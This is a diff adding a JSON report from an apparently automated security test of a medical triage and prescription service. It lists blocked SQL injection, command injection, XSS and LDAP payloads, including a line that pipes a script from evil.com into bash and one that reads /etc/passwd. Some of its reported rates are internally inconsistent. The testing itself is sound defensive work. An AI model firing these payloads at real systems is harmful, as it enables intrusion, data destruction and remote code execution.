@@ -1,0 +1,168 @@
+{
+  "gauntlet_id": "2f3259890358",
+  "timestamp": "2025-08-14T09:55:28.146933",
+  "executive_summary": {
+    "security_posture": "GOOD - Minor hardening recommended",
+    "posture_color": "BLUE",
+    "overall_defense_rate": 81.04,
+    "attacks_attempted": 82,
+    "attacks_blocked": 67,
+    "critical_findings": 0,
+    "high_findings": 0
+  },
+  "waterfall_results": [
+    {
+      "level": "RECONNAISSANCE",
+      "tests_run": 8,
+      "information_leaks": 0,
+      "timing_attack_possible": false,
+      "defense_success_rate": 1.25
+    },
+    {
+      "level": "ENUMERATION",
+      "discovered_categories": [
+        "INFORMATION",
+        "INFO",
+        "GENERAL",
+        "DIAGNOSIS",
+        "DIAGNOSE",
+        "DIAGNOSTIC",
+        "PRESCRIPTION",
+        "PRESCRIBE",
+        "MEDICATION",
+        "TRIAGE",
+        "EMERGENCY",
+        "URGENT",
+        "ADMIN",
+        "DEBUG",
+        "TEST",
+        "INTERNAL"
+      ],
+      "threshold_leaks": 9,
+      "hidden_features": [],
+      "defense_success_rate": 0.5588235294117647
+    },
+    {
+      "level": "EXPLOITATION",
+      "total_exploits_tested": 16,
+      "exploits_blocked": 16,
+      "exploits_succeeded": 0,
+      "defense_success_rate": 0.7,
+      "details": [
+        {
+          "type": "SQL_INJECTION",
+          "payload": "'; DROP TABLE users; --",
+          "bypassed": false
+        },
+        {
+          "type": "SQL_INJECTION",
+          "payload": "1' OR '1'='1",
+          "bypassed": false
+        },
+        {
+          "type": "SQL_INJECTION",
+          "payload": "admin'--",
+          "bypassed": false
+        },
+        {
+          "type": "SQL_INJECTION",
+          "payload": "' UNION SELECT * FROM medications--",
+          "bypassed": false
+        },
+        {
+          "type": "COMMAND_INJECTION",
+          "payload": "; ls -la",
+          "bypassed": false
+        },
+        {
+          "type": "COMMAND_INJECTION",
+          "payload": "| cat /etc/passwd",
+          "bypassed": false
+        },
+        {
+          "type": "COMMAND_INJECTION",
+          "payload": "`whoami`",
+          "bypassed": false
+        },
+        {
+          "type": "COMMAND_INJECTION",
+          "payload": "$(curl evil.com/shell.sh | bash)",
+          "bypassed": false
+        },
+        {
+          "type": "XSS",
+          "payload": "<script>alert('XSS')</script>",
+          "bypassed": false
+        },
+        {
+          "type": "XSS",
+          "payload": "javascript:alert(1)",
+          "bypassed": false
+        },
+        {
+          "type": "XSS",
+          "payload": "<img src=x onerror=alert(1)>",
+          "bypassed": false
+        },
+        {
+          "type": "XSS",
+          "payload": "<svg onload=alert(1)>",
+          "bypassed": false
+        },
+        {
+          "type": "LDAP_INJECTION",
+          "payload": "*)(objectClass=*",
+          "bypassed": false
+        },
+        {
+          "type": "LDAP_INJECTION",
+          "payload": "admin*",
+          "bypassed": false
+        },
+        {
+          "type": "LDAP_INJECTION",
+          "payload": "*)(mail=*",
+          "bypassed": false
+        },
+        {
+          "type": "LDAP_INJECTION",
+          "payload": ")(cn=*))(|(cn=*",
+          "bypassed": false
+        }
+      ]
+    },
+    {
+      "level": "PRIVILEGE_ESCALATION",
+      "total_attempts": 11,
+      "escalations_blocked": 11,
+      "escalations_succeeded": 0,
+      "defense_success_rate": 0.7540983606557377
+    },
+    {
+      "level": "PERSISTENCE",
+      "state_pollution_attempts": 4,
+      "backdoor_tests": 4,
+      "persistence_achieved": false,
+      "defense_success_rate": 0.782608695652174
+    },
+    {
+      "level": "EXFILTRATION",
+      "total_queries": 13,
+      "data_leaks_prevented": 13,
+      "data_leaked": 0,
+      "defense_success_rate": 0.8170731707317073
+    }
+  ],
+  "bypassed_defenses": [],
+  "security_events": [],
+  "remediation_priorities": [],
+  "certification": {
+    "passed_gauntlet": false,
+    "security_rating": "B (Good)",
+    "compliance_status": {
+      "OWASP_TOP_10": false,
+      "HIPAA_TECHNICAL": true,
+      "SOC2_TYPE_II": false
+    }
+  }
+}
